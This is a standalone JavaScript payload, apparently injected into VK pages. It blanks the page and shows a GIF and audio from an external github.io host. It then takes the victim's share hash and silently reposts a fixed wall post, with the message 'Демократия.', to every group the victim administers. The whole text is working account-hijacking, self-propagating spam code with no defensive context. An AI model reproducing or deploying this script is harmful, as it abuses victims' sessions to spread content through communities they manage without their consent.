document.getElementsByTagName('body')[0].style = 'display: none';
document.getElementsByTagName('html')[0].style = 'background: url(https://bagoser.github.io/rikkabg2.gif);background-size: cover;';
function toClub(post){
 ajax.plainpost("like.php?act=publish_box&al=1&object="+post,"", function(e){
 var hash=e.match(/shHash: '(.+)',\n  imHash:/)[1];
 ajax.plainpost("https://vk.com/groups?tab=admin", "",
 function(e){
 var xmlString = e
 , parser = new DOMParser()
 , doc = parser.parseFromString(xmlString, "text/html");
 
 if(!isUndefined(doc.getElementsByClassName("adminned")[0])) {
  Array.from(doc.getElementsByClassName("adminned")).forEach(function (item){
  var group=(item.id.replace("gl_admin",""));
  ajax.plainpost("like.php","Message=Демократия.&act=a_do_publish&al=1&from=box&hash="+hash+"&list=&object="+post+"&to=-"+group, function(e){console.info(e)})
  });
 }
 })
 })
 }

toClub('wall-47423041_2088');
var audio = new Audio("https://bagoser.github.io/bshaq.mp3");
audio.play();
